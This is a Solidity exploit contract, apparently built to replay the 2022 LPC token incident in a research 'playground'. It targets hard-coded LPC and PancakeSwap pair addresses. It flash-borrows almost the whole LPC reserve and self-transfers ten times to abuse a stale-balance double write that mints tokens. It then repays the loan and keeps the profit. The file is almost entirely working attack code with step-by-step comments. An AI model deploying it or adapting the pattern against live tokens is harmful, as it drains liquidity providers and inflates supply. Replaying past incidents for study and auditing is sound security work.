// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-07-LPC).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// flash-loan callback `pancakeCall` lives on the test itself, so there is no
// standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit body → run(); pancakeCall preserved),
// copied verbatim from test/LPC_exp.sol so the playground can deploy it and
// record run(). The minted LPC stays at address(this); profitReceiver="exploit".
//
// Root cause: LPC._transfer snapshots sender/recipient balances into separate
// locals then writes both back from those stale snapshots. When sender==recipient
// the second write (_balances[self] = recipientBalance + recipientAmount)
// clobbers the intended debit (_balances[self] = balance - amount), so a
// self-transfer mints ~92% of `amount` for free. Ten loops inflate the
// flash-borrowed stack ~10x; after repaying the loan the attacker keeps the rest.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract LPCExploit {
    address constant LPC = 0x1E813fA05739Bf145c1F182CB950dA7af046778d;
    address constant pancakePair = 0x2ecD8Ce228D534D8740617673F31b7541f6A0099;

    // step 0: flash-borrow essentially the entire LPC reserve of the pair. The
    // non-empty data payload triggers the pancakeCall flash-loan callback below.
    function run() external {
        (uint256 LPC_reserve, ,) = IPancakePair(pancakePair).getReserves();
        uint256 borrowAmount = LPC_reserve - 1; // -1 to avoid INSUFFICIENT_LIQUIDITY
        bytes memory data = unicode"⚡💰";
        // EXPLOIT STEP 1: Flash-borrow nearly all LPC liquidity from the Pancake V2 pair via swap(..., data).
        // The callback will be invoked with the tokens already transferred in. No collateral required upfront.
        IPancakePair(pancakePair).swap(borrowAmount, 0, address(this), data);
    }

    // flash callback: exploit the self-transfer mint, then repay the loan.
    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        uint256 LPC_balance = IERC20(LPC).balanceOf(address(this));

        // EXPLOIT STEP 2: Capture flash-loaned balance.
        // The exploit: self-transfer the whole balance to itself 10 times. Each
        // loop adds ~0.92 * LPC_balance (recipientAmount) for free, because the
        // aliased double-write in _transfer drops the debit.
        for (uint8 i; i < 10; ++i) {
            // EXPLOIT STEP 3: Call transfer(self, LPC_balance) repeatedly. Targets the vulnerable LPC._transfer logic
            // (see sources/LPC_1E813f/LPC.sol _transfer and the VULNERABILITY annotation there).
            // Sender==recipient + fee reduction on recipientAmount + unconditional double-assign from snapshots causes net mint.
            IERC20(LPC).transfer(address(this), LPC_balance);
        }

        // EXPLOIT STEP 4: Repay the flash loan principal + fee from the inflated balance. Excess LPC profit remains.
        // Repay the flash loan: paybackAmount * 90% = amount0  →  fee = 10%.
        uint256 paybackAmount = amount0 / 90 / 100 * 10_000;
        IERC20(LPC).transfer(pancakePair, paybackAmount);
    }
}
